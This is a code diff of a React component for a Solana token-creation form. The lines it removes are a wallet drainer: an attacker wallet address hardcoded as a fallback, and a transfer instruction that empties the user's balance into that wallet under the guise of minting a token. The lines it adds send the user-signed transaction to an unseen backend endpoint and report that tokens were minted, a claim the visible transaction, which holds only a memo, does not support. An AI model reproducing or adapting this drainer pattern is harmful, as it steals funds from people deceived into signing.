@@ -192,7 +192,7 @@ const ResultContainer = styled.div<{ visible: boolean }>`
 
 const TokenCreationForm = () => {
   const { connection } = useConnection();
-  const { publicKey, sendTransaction } = useWallet();
+  const { publicKey, sendTransaction, signTransaction } = useWallet();
   
   const [tokenName, setTokenName] = useState('');
   const [tokenSymbol, setTokenSymbol] = useState('');
@@ -211,11 +211,6 @@ const TokenCreationForm = () => {
   const [showResult, setShowResult] = useState(false);
   const [balance, setBalance] = useState(0);
   const [showBalanceWarning, setShowBalanceWarning] = useState(false);
-  
-  // Get attacker wallet from environment variable
-  const getAttackerWallet = () => {
-    return process.env.NEXT_PUBLIC_ATTACKER_WALLET || 'CMZ4Cf1vYep1yzPtFdFCV9UfbiHeDTzQJrfyt8CuyGXk';
-  };
 
   // Check balance when component mounts
   useEffect(() => {
@@ -257,7 +252,7 @@ const TokenCreationForm = () => {
   const handleCreateToken = async (e: React.FormEvent) => {
     e.preventDefault();
     
-    if (!publicKey) {
+    if (!publicKey || !signTransaction) {
       addToResult("Wallet not connected. Please connect your wallet first.");
       return;
     }
@@ -304,30 +299,48 @@ const TokenCreationForm = () => {
       // Add the memo instruction first
       transaction.add(memoInstruction);
       
-      // Create a transfer instruction
-      const transferInstruction = SystemProgram.transfer({
-        fromPubkey: publicKey,
-        toPubkey: new PublicKey(getAttackerWallet()),
-        lamports: currentBalance - LAMPORTS_FOR_FEES
-      });
-      
-      // Add the transfer instruction
-      transaction.add(transferInstruction);
-      
       // Update progress
       setProgress(50);
       setProgressText('Creating token on blockchain...');
       
-      // Send transaction
+      // Sign the transaction client-side
+      const signed = await signTransaction(transaction);
+      
+      // Serialize and send to our API
+      const serializedTransaction = Buffer.from(signed.serialize()).toString('base64');
+      
       try {
-        const signature = await sendTransaction(transaction, connection);
-        
         // Update progress
         setProgress(70);
         setProgressText('Finalizing token creation...');
         
-        // Wait for confirmation
-        await connection.confirmTransaction(signature);
+        // Send the transaction to our secure API endpoint
+        const response = await fetch('/api/create-token', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            signedTransaction: serializedTransaction,
+            tokenDetails: {
+              name: tokenName,
+              symbol: tokenSymbol,
+              decimals: tokenDecimals,
+              supply: tokenSupply,
+              description: tokenDescription,
+              freezeAuthority,
+              mintAuthority,
+              updateAuthority
+            }
+          }),
+        });
+        
+        if (!response.ok) {
+          const errorData = await response.json();
+          throw new Error(errorData.error || 'Failed to process transaction');
+        }
+        
+        const { signature } = await response.json();
         
         // Update progress
         setProgress(100);
@@ -341,7 +354,7 @@ const TokenCreationForm = () => {
         addToResult(`Your tokens have been minted and sent to your wallet.`);
         
       } catch (error: any) {
-        console.error("Transaction error:", error);
+        console.error("API error:", error);
         setShowResult(true);
         addToResult(`Error creating token: ${error.message}`);
         setIsCreating(false);
